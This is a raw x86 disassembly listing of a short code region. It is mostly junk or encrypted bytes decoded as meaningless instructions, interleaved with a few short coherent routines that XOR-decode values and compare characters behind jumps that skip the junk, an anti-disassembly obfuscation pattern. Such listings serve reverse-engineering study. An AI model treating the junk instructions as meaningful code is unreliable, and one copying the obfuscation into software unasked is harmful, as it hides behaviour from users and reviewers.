  403269:	add    eax,ecx
  40326b:	lea    ebp,[esi-0x23]
  40326e:	sbb    DWORD PTR [edi-0x73fa88bf],esp
  403274:	mov    dl,0xde
  403276:	mov    ds:0xbb9a7542,eax
  40327b:	mov    eax,ds:0x4c62e374
  403280:	je     0x403271
  403282:	dec    esi
  403283:	jns    0x403212
  403285:	les    ecx,FWORD PTR [edx]
  403287:	call   0x8ea6:0xb8e523e4
  40328e:	adc    ebp,DWORD PTR [ebx]
  403290:	dec    edi
  403291:	fwait
  403292:	add    eax,0x58d830b2
  403297:	push   cs
  403298:	(bad)  
  40329a:	or     ecx,0xffffffb7
  40329d:	cmp    eax,0x2f5360a9
  4032a2:	aad    0x12
  4032a4:	inc    ebx
  4032a5:	dec    edx
  4032a6:	pop    ebx
  4032a7:	and    DWORD PTR [edx],edi
  4032a9:	mov    eax,0xb7d6f80e
  4032ae:	push   eax
  4032af:	add    DWORD PTR [eax],esi
  4032b1:	push   ecx
  4032b2:	call   0x8ff0:0x77c6fb23
  4032b9:	into   
  4032ba:	or     ebp,DWORD PTR [edx]
  4032bc:	xor    esp,0xffffff80
  4032bf:	adc    eax,0x8726dd99
  4032c4:	std    
  4032c5:	adc    eax,DWORD PTR [ebx]
  4032c7:	in     eax,0x8a
  4032c9:	jmp    0x37d:0x7899079d
  4032d0:	add    esp,ebx
  4032d2:	jbe    0x40329e
  4032d4:	and    ah,BYTE PTR [ebp+0x44ac21d4]
  4032da:	outs   dx,BYTE PTR ds:[esi]
  4032db:	jne    0x40331a
  4032dd:	xor    eax,0x697ee6dc
  4032e2:	or     esi,DWORD PTR [ebx-0x69f043de]
  4032e8:	jnp    0x4032e3
  4032ea:	jecxz  0x403360
  4032ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032ed:	add    DWORD PTR [esi],ecx
  4032ef:	mov    esi,0x228b75ef
  4032f4:	lea    edi,[ecx+ebp*4]
  4032f7:	data16 or BYTE PTR [esi],ch
  4032fa:	aad    0xdb
  4032fc:	cmp    ah,al
  4032fe:	rol    al,1
  403300:	retf   
  403301:	inc    ebx
  403302:	cmp    eax,0xfd9a07b8
  403307:	add    al,0x9b
  403309:	in     al,0x9a
  40330b:	push   esi
  40330c:	jle    0x4032a9
  40330e:	sub    al,0x3a
  403310:	pop    es
  403311:	scas   al,BYTE PTR es:[edi]
  403312:	push   ds
  403313:	imul   esi,DWORD PTR [edx+0xf50983c],0xf931f316
  40331d:	outs   dx,DWORD PTR ds:[esi]
  40331e:	inc    eax
  40331f:	cs mov al,0xbc
  403322:	mov    edi,0x3803912d
  403327:	inc    ecx
  403328:	(bad)  
  403329:	outs   dx,BYTE PTR ds:[esi]
  40332a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40332b:	pop    ebx
  40332c:	ucomiss xmm1,xmm7
  40332f:	inc    ebp
  403330:	aas    
  403331:	iret   
  403332:	mov    esp,0x40a93241
  403337:	xor    al,BYTE PTR [ecx+0x4e776cd8]
  40333d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40333e:	pop    edi
  40333f:	xchg   esp,eax
  403340:	mov    cl,0xf8
  403342:	pushf  
  403343:	pop    ebx
  403344:	pop    ss
  403345:	jle    0x403379
  403347:	sub    eax,0x493b38b0
  40334c:	out    0x34,al
  40334e:	add    edi,esp
  403350:	mov    esp,0x7d723088
  403355:	jl     0x403323
  403357:	push   ds
  403358:	dec    esi
  403359:	sbb    BYTE PTR [eax],bh
  40335b:	pusha  
  40335c:	cmp    ebp,DWORD PTR ds:0x9310886d
  403362:	mul    BYTE PTR fs:[edi+0x36f2c03a]
  403369:	dec    ebp
  40336a:	aaa    
  40336b:	repz je 0x4033a4
  40336e:	xchg   edi,eax
  40336f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403370:	sahf   
  403371:	jg     0x4033d4
  403373:	pop    ecx
  403374:	js     0x403311
  403376:	ja     0x4033c7
  403378:	or     ebx,DWORD PTR [eax+esi*1]
  40337b:	outs   dx,DWORD PTR ds:[esi]
  40337c:	cwde   
  40337d:	(bad)  
  40337e:	stos   DWORD PTR es:[edi],eax
  40337f:	call   0xdd54ef94
  403384:	pushf  
  403385:	inc    eax
  403386:	imul   edx,esp,0xffffffb9
  403389:	cmp    cl,bh
  40338b:	xchg   ebp,eax
  40338c:	xor    eax,0xc2718b18
  403391:	or     eax,0x7d856342
  403396:	cs dec ebx
  403398:	pop    edx
  403399:	dec    ebx
  40339a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40339b:	call   0x303e849b
  4033a0:	int    0x9
  4033a2:	mov    al,0xed
  4033a4:	jge    0x403416
  4033a6:	push   ebx
  4033a7:	mov    edi,0x3a15eac6
  4033ac:	pop    ebp
  4033ad:	dec    esp
  4033ae:	pop    edx
  4033af:	mov    dh,0xf
  4033b1:	test   al,0x49
  4033b3:	out    dx,eax
  4033b4:	int    0xb8
  4033b6:	mov    ds:0xf0a0eeaa,eax
  4033bb:	mov    WORD PTR [ecx+0x1b],?
  4033be:	mov    edx,0xae6cd847
  4033c3:	cmp    BYTE PTR [ebx],dl
  4033c5:	mov    eax,ds:0xfd9e1449
  4033ca:	cli    
  4033cb:	test   BYTE PTR [ebx-0x3a2944dc],dh
  4033d1:	stc    
  4033d2:	dec    ecx
  4033d3:	cwd    
  4033d5:	cmp    ebp,DWORD PTR [ebx+0x1b]
  4033d8:	lock in eax,0xcf
  4033db:	cwde   
  4033dc:	stos   BYTE PTR es:[edi],al
  4033dd:	es sbb eax,0x53414c7e
  4033e3:	mov    ah,0xf
  4033e5:	inc    ebp
  4033e6:	je     0x40344a
  4033e8:	icebp  
  4033e9:	pop    eax
  4033ea:	pop    esi
  4033eb:	stos   BYTE PTR es:[edi],al
  4033ec:	and    al,0x9
  4033ee:	(bad)  
  4033ef:	iret   
  4033f0:	int3   
  4033f1:	mov    cl,0x24
  4033f3:	std    
  4033f4:	stos   BYTE PTR es:[edi],al
  4033f5:	repz mov cl,0x91
  4033f8:	pop    ss
  4033f9:	sub    eax,0x2f8e1871
  4033fe:	or     esp,DWORD PTR [esp+ebx*8]
  403401:	test   DWORD PTR [esi-0x3f6caee5],edx
  403407:	cmp    al,0x4
  403409:	pop    edx
  40340a:	sbb    ch,0xa2
  40340d:	add    DWORD PTR [ebp+0x613b0e27],edi
  403413:	or     ebp,DWORD PTR [ecx]
  403415:	ss out 0x2c,al
  403418:	mov    esi,0x32729b
  40341d:	neg    DWORD PTR ds:0x430459
  403423:	add    eax,esi
  403425:	jmp    0x403432
  40342a:	mov    dl,BYTE PTR [ebp-0x1]
  40342d:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403431:	inc    eax
  403432:	cmp    eax,0x40
  403435:	jb     0x40342a
  40343b:	mov    edx,DWORD PTR [ebp-0x8]
  40343e:	mov    eax,DWORD PTR [ebp-0xc]
  403441:	jmp    0x40360e
  403446:	mov    ds:0x9b821f26,eax
  40344b:	and    DWORD PTR [ebx-0x712401d9],0xffffff90
  403452:	shr    BYTE PTR [edx+0x14021d67],1
  403458:	jle    0x4034d8
  40345a:	scas   al,BYTE PTR es:[edi]
  40345b:	jg     0x4034db
  40345d:	jle    0x403415
  40345f:	xchg   edx,eax
  403460:	fwait
  403461:	push   edi
  403462:	push   edi
  403463:	mov    bl,BYTE PTR [ebp+ebx*2+0x0]
  403467:	dec    esp
  403468:	cmp    al,0x50
  40346a:	retf   
  40346b:	sub    eax,0xa74e78d8
  403470:	xchg   edx,eax
  403471:	std    
  403472:	rcl    BYTE PTR [ebx+eax*8-0x66],0x78
  403477:	push   esp
  403478:	adc    ebp,DWORD PTR [ecx]
  40347a:	or     eax,0x47855e89
  40347f:	(bad)  
  403480:	cmp    al,0x62
  403482:	rol    cl,1
  403484:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403485:	xor    ch,BYTE PTR [esi]
  403487:	call   0xf3ba:0xa01a2a43
  40348e:	and    BYTE PTR [edi-0x711957ce],bh
  403494:	shr    BYTE PTR [ebp+0x5220a721],0x83
  40349b:	pop    eax
  40349c:	shr    BYTE PTR [ecx-0x33b80ff8],cl
  4034a2:	rcr    BYTE PTR [esi+0x24],cl
  4034a5:	sub    al,0x41
  4034a7:	shl    DWORD PTR [eax],0xf5
  4034aa:	dec    ebx
  4034ab:	repnz mov edi,0x763a2df1
  4034b1:	and    ah,BYTE PTR [ebx+ebp*1+0x78]
  4034b5:	sbb    eax,0x7b646d92
  4034ba:	(bad)  
  4034bc:	jmp    FWORD PTR [eax]
  4034be:	adc    al,0xc8
  4034c0:	int3   
  4034c1:	mov    dl,0xc6
  4034c3:	push   edx
  4034c4:	clc    
  4034c5:	jmp    0x2d7c:0x8b7b5dfe
  4034cc:	sbb    eax,0x885c26e3
  4034d1:	int3   
  4034d2:	xchg   edi,eax
  4034d3:	xchg   edx,eax
  4034d4:	dec    edi
  4034d5:	add    eax,0xcf5bb798
  4034da:	(bad)  
  4034db:	jne    0x403472
  4034dd:	jle    0x40354a
  4034df:	out    dx,al
  4034e0:	stos   DWORD PTR es:[edi],eax
  4034e1:	pop    esp
  4034e2:	push   ebp
  4034e3:	icebp  
  4034e4:	xchg   esi,eax
  4034e5:	jl     0x403480
  4034e7:	jge    0x403488
  4034e9:	mov    edx,0x50ac997
  4034ee:	xchg   BYTE PTR [ecx+0x14],ch
  4034f1:	js     0x4034c1
  4034f3:	fidivr DWORD PTR [esi-0x1d]
  4034f6:	lds    eax,FWORD PTR [ebx+0x6956add]
  4034fc:	sbb    dl,BYTE PTR [edx]
  4034fe:	icebp  
  4034ff:	imul   eax,DWORD PTR [esi+0x3],0x4fa5010a
  403506:	push   cs
  403507:	and    DWORD PTR [ebp-0x4c],ecx
  40350a:	and    eax,0xf51013b0
  40350f:	fsubr  DWORD PTR ds:0xd0cd073
  403515:	imul   DWORD PTR [ebp+0x7b]
  403518:	in     eax,0x4b
  40351a:	nop
  40351b:	in     eax,dx
  40351c:	lock ds pushf 
  40351f:	mov    edi,DWORD PTR [ebx+0x3776ff39]
  403525:	push   eax
  403526:	jmp    0x5244f447
  40352b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40352c:	adc    esi,edx
  40352e:	ss ret 
  403530:	inc    ebx
  403531:	pop    edi
  403532:	add    ah,dh
  403534:	jg     0x4034df
  403536:	idiv   DWORD PTR [esi+0x4352821c]
  40353c:	enter  0x650c,0xf1
  403540:	mov    ah,0x84
  403542:	imul   esp,DWORD PTR [esi+eax*2+0xe],0x66
  403547:	fisttp WORD PTR [esi+0x3c9ef659]
  40354d:	stos   DWORD PTR es:[edi],eax
  40354e:	xor    ebp,DWORD PTR [edi]
  403550:	ja     0x403516
  403552:	dec    esp
  403553:	leave  
  403554:	pop    ecx
  403555:	pop    ds
  403556:	dec    esp
  403557:	adc    esp,DWORD PTR [esi+0x3f026969]
  40355d:	inc    ecx
  40355e:	push   ds
  40355f:	or     ebp,ebp
  403561:	push   ss
  403562:	mov    esp,ecx
  403564:	cmp    al,0x93
  403566:	es int3 
  403568:	jl     0x40351e
  40356a:	cmc    
  40356b:	aad    0x96
  40356d:	push   esp
  40356e:	xor    DWORD PTR [ecx+eiz*2-0x5d],eax
  403572:	fdivr  QWORD PTR ds:0x282f35fa
  403578:	cmp    eax,0x453104a5
  40357d:	sub    DWORD PTR [esi+0x420aa71],esi
  403583:	push   esi
  403584:	pop    ebx
  403585:	push   0xffffff9c
  403587:	and    esi,DWORD PTR [esi+0x7a8b7ec0]
  40358d:	jl     0x403513
  40358f:	iret   
  403590:	xchg   ebx,eax
  403591:	popa   
  403592:	xor    ebp,DWORD PTR [ebx+0x62]
  403595:	sub    DWORD PTR [ecx-0x5fa0a29c],esp
  40359b:	dec    eax
  40359c:	jmp    0x65e5:0x74a56aa5
  4035a3:	inc    edx
  4035a4:	lahf   
  4035a5:	jae    0x403582
  4035a7:	mov    esp,0x34dff657
  4035ac:	ret    
  4035ad:	dec    esi
  4035ae:	jg     0x4035ee
  4035b0:	pop    edx
  4035b1:	repnz outs dx,DWORD PTR ds:[esi]
  4035b3:	xor    ecx,DWORD PTR [edx+0x6159b19b]
  4035b9:	imul   edx,DWORD PTR [ebp-0x7c],0xd42082f2
  4035c0:	out    0x63,eax
  4035c2:	sahf   
  4035c3:	(bad)  
  4035c4:	jl     0x40356f
  4035c6:	imul   ecx,eax,0xffffffb3
  4035c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035ca:	jge    0x40356b
  4035cc:	dec    eax
  4035cd:	in     al,dx
  4035ce:	fld    QWORD PTR [ecx]
  4035d0:	push   es
  4035d1:	inc    edi
  4035d2:	mov    ?,WORD PTR [ecx]
  4035d4:	add    al,0xa1
  4035d6:	bnd jle 0x4035db
  4035d9:	cdq    
  4035da:	jbe    0x4035df
  4035dc:	les    eax,FWORD PTR [edi+0x1f]
  4035df:	repz add BYTE PTR [ebx-0x580bd288],bh
  4035e6:	js     0x403601
  4035e8:	je     0x4035fe
  4035ea:	pop    ecx
  4035eb:	rcr    DWORD PTR [eax],cl
  4035ed:	pop    ebx
  4035ee:	dec    ebp
  4035ef:	pop    ebp
  4035f0:	js     0x40358f
  4035f2:	mov    ebp,DWORD PTR [esi]
  4035f4:	or     DWORD PTR [esi+ebx*1-0x80],ebx
  4035f8:	push   ds
  4035f9:	mov    ds:0xc9d06672,eax
  4035fe:	jmp    0x403668
  403600:	into   
  403601:	mov    ch,0x70
  403603:	les    ecx,FWORD PTR [ebx]
  403605:	(bad)  
  403606:	mov    ebx,0x19c9e8dd
  40360b:	jmp    0x4035a6
  40360d:	sbb    esi,DWORD PTR [ebx]
  40360f:	rol    DWORD PTR [ebx],1
  403611:	(bad)  
  403612:	cmp    edx,eax
  403614:	je     0x40365a
  40361a:	push   ebx
  40361b:	push   edi
  40361c:	mov    edi,DWORD PTR [ebp+0x8]
  40361f:	mov    eax,0x8a3c
  403624:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403629:	mov    edi,0x3b02
  40362e:	add    ax,di
  403631:	movzx  eax,ax
  403634:	mov    DWORD PTR [ebp-0x14],eax
  403637:	mov    eax,DWORD PTR [ebp+0x8]
  40363a:	movzx  eax,WORD PTR [eax+edx*4]
  40363e:	xor    eax,0x8a3c
  403643:	add    eax,edi
  403645:	mov    edi,DWORD PTR [ebp-0x14]
  403648:	mov    BYTE PTR [ebp+edi*1-0x58],al
  40364c:	mov    eax,DWORD PTR [ebp-0xc]
  40364f:	inc    edx
  403650:	cmp    edx,eax
  403652:	jne    0x40361c
  403658:	pop    edi
  403659:	pop    ebx
  40365a:	mov    eax,DWORD PTR [ebp-0x8]
  40365d:	jmp    0x40382a
  403662:	jo     0x403624
  403664:	add    ecx,DWORD PTR [eax-0x1f8eb64d]
  40366a:	mov    esp,0x7e3dd7c8
  40366f:	cmp    bh,bl
  403671:	and    esi,DWORD PTR [edx-0x518181eb]
  403677:	jg     0x4036f7
  403679:	jle    0x4036a8
  40367b:	fiadd  WORD PTR [edx]
  40367d:	sbb    eax,0xcbb3903f
  403682:	pop    esp
  403683:	jecxz  0x4036f2
  403685:	in     eax,dx
  403686:	and    cl,dh
  403688:	outs   dx,BYTE PTR ds:[esi]
  403689:	push   esi
  40368a:	outs   dx,BYTE PTR ds:[esi]
  40368b:	mov    es,edx
  40368d:	inc    eax
  40368e:	icebp  
  40368f:	push   esp
  403690:	loop   0x403632
  403692:	mov    dh,0xf2
  403694:	mov    eax,ds:0x95455dc3
  403699:	jo     0x403700
  40369b:	adc    eax,0x27e81b32
  4036a0:	xchg   ebx,eax
  4036a1:	adc    BYTE PTR [ebx],cl
  4036a3:	outs   dx,BYTE PTR ds:[esi]
  4036a4:	icebp  
  4036a5:	cmp    eax,0xff56a43b
  4036aa:	(bad)
  4036ad:	mov    esi,0x27b5b83f
  4036b2:	xchg   ecx,eax
  4036b3:	jp     0x40369d
  4036b5:	test   ch,al
  4036b7:	retf   
  4036b8:	cli    
  4036b9:	retf   
  4036ba:	addr16 dec ebx
  4036bc:	xor    dl,BYTE PTR [ecx]
  4036be:	and    dh,BYTE PTR [ecx+edi*8]
  4036c1:	in     al,dx
  4036c2:	xchg   DWORD PTR fs:[ecx],ebp
  4036c5:	xchg   BYTE PTR [ebx+esi*4],bl
  4036c8:	mov    cl,0x8b
  4036ca:	xchg   DWORD PTR ds:0xc56155b7,ebx
  4036d0:	mov    edi,0xe12dae1d
  4036d5:	es pop ecx
  4036d7:	nop
  4036d8:	dec    edi
  4036d9:	mov    eax,0x5e48ce30
  4036de:	mov    WORD PTR [edi+0x4a],cs
  4036e1:	(bad)  
  4036e2:	fisubr DWORD PTR [ebp-0x909a643]
  4036e8:	sub    al,0x89
  4036ea:	mov    dh,0x4e
  4036ec:	popf   
  4036ed:	ret    0x7da7
  4036f0:	pop    edi
  4036f1:	add    BYTE PTR [ebp-0x18e94bdf],dl
  4036f7:	push   0xc9a7640
  4036fc:	push   ds
  4036fd:	mov    ds:0xa724ef83,al
  403702:	lods   eax,DWORD PTR ds:[esi]
  403703:	stc    
  403704:	aaa    
  403705:	inc    edi
  403706:	es jne 0x4036d9
  403709:	xor    ah,ah
  40370b:	and    BYTE PTR [edx+edi*1+0x32],0xf6
  403710:	inc    ecx
  403711:	shl    eax,0xb1
  403714:	lahf   
  403715:	mov    ch,0x5e
  403717:	mov    ebx,esp
  403719:	mov    ecx,0x8c689a33
  40371e:	fadd   DWORD PTR [ecx+0x2f23edc1]
  403724:	push   ebp
  403725:	add    ecx,DWORD PTR [edx]
  403727:	jecxz  0x40378a
  403729:	lods   eax,DWORD PTR ds:[esi]
  40372a:	aad    0x58
  40372c:	ds push cs
  40372e:	lds    eax,FWORD PTR [ecx+0x3121adc7]
  403734:	and    ecx,DWORD PTR [ecx-0x573b288]
  40373a:	jmp    0x403724
  40373c:	fcom   DWORD PTR [esi+esi*2-0x1f26c9d2]
  403743:	fstp   TBYTE PTR [ecx+0x6e62498a]
  403749:	pop    ecx
  40374a:	sub    al,0x88
  40374c:	je     0x40372e
  40374e:	leave  
  40374f:	lods   eax,DWORD PTR ds:[esi]
  403750:	jbe    0x403757
  403752:	add    esp,esp
  403754:	xchg   edx,eax
  403755:	jl     0x4037b3
  403757:	(bad)  [esp+eax*8+0x37]
  40375b:	adc    eax,0x33cb0a7c
  403760:	push   ecx
  403761:	lock mov dh,0x40
  403764:	retf   
  403765:	iret   
  403766:	and    ch,BYTE PTR [ebx]
  403768:	sub    eax,0x8ffc302a
  40376d:	jb     0x4037ca
  40376f:	push   0x8043d885
  403774:	scas   al,BYTE PTR es:[edi]
  403775:	dec    esp
  403776:	xor    al,BYTE PTR [edx-0x6fc0fbe4]
  40377c:	push   edi
  40377d:	pushf  
  40377e:	imul   ebp,esi,0x448cfacb
  403784:	add    DWORD PTR [edi],0xffffffd4
  403787:	sbb    ch,BYTE PTR [ecx+0x5f]
  40378a:	pusha  
  40378b:	sub    BYTE PTR [esi],0xa0
  40378e:	pushf  
  40378f:	jmp    0xda36:0x22e4091b
  403796:	xor    edx,edi
  403798:	aaa    
  403799:	rcr    DWORD PTR ds:[eax],1
  40379c:	jp     0x40375b
  40379e:	ret    0x4df
  4037a1:	cmp    DWORD PTR [edx+ecx*8-0x76],esi
  4037a5:	ret    0xb6
  4037a8:	aas    
  4037a9:	cmp    edx,DWORD PTR [edx]
  4037ab:	mov    ebx,0x8077616d
  4037b0:	(bad)  
  4037b1:	push   ss
  4037b2:	pusha  
  4037b3:	dec    esi
  4037b4:	push   edx
  4037b5:	mov    WORD PTR [esi],ss
  4037b7:	dec    ebx
  4037b8:	sub    ecx,edx
  4037ba:	js     0x4037fa
  4037bc:	inc    edi
  4037bd:	mov    ah,0x62
  4037bf:	ret    
  4037c0:	inc    si
  4037c2:	push   0x3
  4037c4:	pushf  
  4037c5:	mov    ch,0x4c
  4037c7:	or     ecx,ecx
  4037c9:	inc    eax
  4037ca:	jae    0x4037bc
  4037cc:	jae    0x403848
  4037ce:	ins    DWORD PTR es:[edi],dx
  4037cf:	jae    0x403850
  4037d1:	adc    al,0x6a
  4037d3:	sub    BYTE PTR [edi],dl
  4037d5:	or     al,cl
  4037d7:	repz clc 
  4037d9:	(bad)  
  4037da:	pop    eax
  4037db:	mov    edi,esp
  4037dd:	das    
  4037de:	inc    edi
  4037df:	mov    cl,0x2d
  4037e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037e2:	or     al,0x48
  4037e4:	ja     0x403808
  4037e6:	cs adc dl,dl
  4037e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037ea:	push   edx
  4037eb:	test   DWORD PTR [ebx],ebp
  4037ed:	fsub   QWORD PTR [edx]
  4037ef:	xor    al,0xba
  4037f1:	cli    
  4037f2:	aas    
  4037f3:	pushf  
  4037f4:	cli    
  4037f5:	mov    bl,0xe6
  4037f7:	mov    edi,0xb177b394
  4037fc:	sbb    al,0xcb
  4037fe:	clc    
  4037ff:	xchg   edi,eax
  403800:	add    DWORD PTR [ebx+0x6],ebp
  403803:	icebp  
  403804:	sub    ebx,DWORD PTR [edx-0x413d7470]
  40380a:	arpl   WORD PTR [ebx+0x59278ca],sp
  403810:	sbb    eax,0xbf664752
  403815:	lahf   
  403816:	loope  0x4037d6
  403818:	aam    0xe2
  40381a:	mov    ebx,0x33504e30
  40381f:	cmp    eax,0x3b1a0b1
  403824:	icebp  
  403825:	mov    dh,0xa4
  403827:	jecxz  0x403822
  403829:	mov    edx,DWORD PTR cs:[ebp+0x10]
  40382d:	xor    eax,ecx
  40382f:	add    eax,esi
  403831:	jmp    0x4039fe
  403836:	jl     0x403858
  403838:	mov    cl,0xb0
  40383a:	mov    cl,0xb1
  40383c:	jge    0x4037ee
  40383e:	fld    QWORD PTR [edi]
  403840:	call   0x72f65e23
  403845:	pop    ss
  403846:	loop   0x40385b
  403848:	jle    0x4038c8
  40384a:	scas   al,BYTE PTR es:[edi]
  40384b:	jg     0x4038cb
  40384d:	jle    0x4037dc
  40384f:	mov    DWORD PTR [ebx+0x4ceea6b8],esi
  403855:	sbb    esi,esi
  403857:	mov    eax,ds:0xd21db34
  40385c:	mov    ebx,ebp
  40385e:	call   0x951a:0x6dc3142b
  403865:	repnz xchg edx,eax
  403867:	fcmovnb st,st(4)
  403869:	jb     0x4037f9
  40386b:	pop    esp
  40386c:	inc    eax
  40386d:	add    dh,cl
  40386f:	ins    BYTE PTR es:[edi],dx
  403870:	mov    eax,ds:0xe8d55273
  403875:	sub    DWORD PTR [eax+0xa8e02f5],eax
  40387b:	jno    0x403823
  40387d:	push   eax
  40387e:	retf   
  40387f:	jns    0x403818
  403881:	push   esp
  403882:	(bad)  
  403883:	ja     0x4038c5
  403885:	mov    ah,0x62
  403887:	push   esi
  403888:	adc    esp,0xffffff91
  40388b:	or     dh,BYTE PTR cs:[ecx-0x1d6e2f24]
  403892:	mov    cl,0xd2
  403894:	hlt    
  403895:	aas    
  403896:	push   cs
  403897:	imul   ebx,DWORD PTR [edi+0x6df1d8da],0xeefb296d
  4038a1:	test   BYTE PTR [ecx-0x1e22da1],0x44
  4038a8:	int    0xb7
  4038aa:	sti    
  4038ab:	and    al,dl
  4038ad:	sbb    al,0x56
  4038af:	cmp    al,0x58
  4038b1:	adc    al,0x2e
  4038b3:	adc    BYTE PTR [edi-0x4c],ah
  4038b6:	cli    
  4038b7:	lahf   
  4038b8:	adc    eax,ebx
  4038ba:	xchg   edi,eax
  4038bb:	fild   WORD PTR [esp+ebp*4+0x2885a39c]
  4038c2:	inc    esi
  4038c3:	adc    BYTE PTR [ebp+0x56],cl
  4038c6:	pop    esi
  4038c7:	mov    ss,WORD PTR [eax]
  4038c9:	test   DWORD PTR [ecx-0x6b0c3a7d],eax
  4038cf:	mov    BYTE PTR [esi+0x4af1b357],0x91
  4038d6:	jmp    0x5f34ef37
  4038db:	fucompp 
  4038dd:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4038df:	mov    esp,0xa9535524
  4038e4:	cmp    eax,0x892a4937
  4038e9:	jo     0x403900
  4038eb:	cmp    al,cl
  4038ed:	dec    ebx
  4038ee:	mov    ch,0xbe
  4038f0:	dec    esi
  4038f1:	ret    
  4038f2:	mov    ah,BYTE PTR [esi]
  4038f4:	mov    BYTE PTR [esi],dh
  4038f6:	and    DWORD PTR [ebp+eiz*2-0x46a18a49],0xffffffed
  4038fe:	pop    ss
  4038ff:	xor    eax,0xd932178c
  403904:	daa    
  403905:	jns    0x4038f9
  403907:	jmp    0x131b9cb0
  40390c:	mov    eax,0x9780d2d1
  403911:	dec    eax
  403912:	ret    0x404d
  403915:	xor    al,BYTE PTR [esp-0x2d85ca27]
  40391c:	jmp    0xc5ea8207
  403921:	inc    DWORD PTR [ebx]
  403923:	pop    ss
  403924:	xchg   esi,eax
  403925:	jg     0x403988
  403927:	outs   dx,BYTE PTR ds:[esi]
  403928:	mov    dl,0xaa
  40392a:	mov    al,0x8b
  40392c:	(bad)  
  40392d:	ror    DWORD PTR [edx+edx*2],1
  403930:	jmp    0x253f60c9
  403935:	pop    esp
  403936:	jbe    0x4039b2
  403938:	test   eax,0x57301f1f
  40393d:	sbb    edi,DWORD PTR [edi]
  40393f:	div    BYTE PTR [ecx-0x4735255c]
  403945:	stos   DWORD PTR es:[edi],eax
  403946:	lahf   
  403947:	sub    DWORD PTR [ecx],0xffffffce
  40394a:	(bad)  
  40394b:	sub    al,BYTE PTR [ebx-0x7b04ee9c]
  403951:	clc    
  403952:	idiv   BYTE PTR ds:0x99dd9c1
  403958:	repnz mov DWORD PTR [esi+edi*8-0x23755664],esp
  403960:	popa   
  403961:	push   ds
  403962:	in     al,0x3
  403964:	hlt    
  403965:	mov    ah,0xc5
  403967:	int3   
  403968:	in     al,dx
  403969:	mov    dh,0x72
  40396b:	js     0x403919
  40396d:	jne    0x403934
  40396f:	xor    ah,BYTE PTR [eax+0x23]
  403972:	inc    eax
  403973:	icebp  
  403974:	mov    esp,0x9ae0de54
  403979:	jmp    0xb6120c93
  40397e:	mov    bh,0xaf
  403980:	dec    ebp
  403981:	lock push cs
  403983:	ins    DWORD PTR es:[edi],dx
  403984:	jl     0x4039b0
  403986:	pusha  
  403987:	sar    BYTE PTR [ebx-0x5bd1cb00],0x73
  40398e:	jnp    0x4039ee
  403990:	push   0x489b9aca
  403995:	mov    bh,0x4d
  403997:	push   cs
  403998:	in     eax,dx
  403999:	jb     0x40393c
  40399b:	sbb    DWORD PTR es:[eax+eiz*1-0x21],edx
  4039a0:	int3   
  4039a1:	out    0x66,eax
  4039a3:	xchg   edx,eax
  4039a4:	mov    esi,0xb1fb2389
  4039a9:	stos   BYTE PTR es:[edi],al
  4039aa:	add    al,0x89
  4039ac:	pop    ds
  4039ad:	bound  edx,QWORD PTR [edx+0x1d]
  4039b0:	aas    
  4039b1:	push   ds
  4039b2:	mov    bh,0x8e
  4039b4:	fdivr  QWORD PTR [eax-0x52]
  4039b7:	jl     0x40397f
  4039b9:	jle    0x4039c1
  4039bb:	xor    DWORD PTR [esi],ebx
  4039bd:	daa    
  4039be:	scas   al,BYTE PTR es:[edi]
  4039bf:	imul   edx,DWORD PTR [edi+0x4f],0x4d
  4039c3:	icebp  
  4039c4:	aad    0xed
  4039c6:	leave  
  4039c7:	sub    esp,DWORD PTR [edi]
  4039c9:	gs ins DWORD PTR es:[edi],dx
  4039cb:	add    eax,0x374cf3b5
  4039d0:	pop    ds
  4039d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039d2:	pop    esi
  4039d3:	lock and eax,0x1b66bfae
  4039d9:	cli    
  4039da:	push   esp
  4039db:	cmp    DWORD PTR [esp+ebx*8-0x617df0df],esp
  4039e2:	cs ret 
  4039e4:	push   ebp
  4039e5:	fld    DWORD PTR [ebp+0x41887fcc]
  4039eb:	fldcw  WORD PTR [edi+0x7b2ab2f0]
  4039f1:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4039f3:	cmp    BYTE PTR [ebx+0x67],ah
  4039f6:	xchg   BYTE PTR [ebx+esi*1+0x188e8065],ch
  4039fd:	push   es
  4039fe:	mov    DWORD PTR [edx],eax
  403a00:	mov    eax,DWORD PTR [ebp-0x8]
  403a03:	xor    eax,ecx
  403a05:	add    eax,esi
  403a07:	mov    DWORD PTR [ebp+0x8],eax
  403a0a:	mov    eax,DWORD PTR [ebp+0x8]
  403a0d:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a11:	mov    dl,BYTE PTR [ebp-0x1]
  403a14:	cmp    al,dl
  403a16:	je     0x403fc0
  403a1c:	mov    eax,DWORD PTR [ebp+0x8]
  403a1f:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a23:	mov    edx,DWORD PTR [ebp+0xc]
  403a26:	cmp    al,BYTE PTR [edx]
  403a28:	jne    0x4041b3
  403a2e:	mov    eax,DWORD PTR [ebp-0x8]
  403a31:	mov    edx,DWORD PTR [ebp+0xc]
  403a34:	movsx  edx,BYTE PTR [edx]
  403a37:	xor    eax,ecx
  403a39:	add    eax,esi
  403a3b:	cmp    edx,eax
  403a3d:	jmp    0x403c0a
  403a42:	retf   
  403a43:	int3   
  403a44:	push   edi
  403a45:	push   0x6df17151
  403a4a:	mov    ch,0x57
  403a4c:	push   ebx
  403a4d:	mov    edi,0x41d2d955
  403a52:	adc    dl,BYTE PTR [ecx]
  403a54:	jle    0x403ad4
  403a56:	scas   al,BYTE PTR es:[edi]
  403a57:	jg     0x403ad7
  403a59:	jle    0x403a29
  403a5b:	ror    DWORD PTR [edi],cl
  403a5d:	dec    ebx
  403a5e:	jmp    0xf818:0xa0034647
  403a65:	pushf  
  403a66:	pop    es
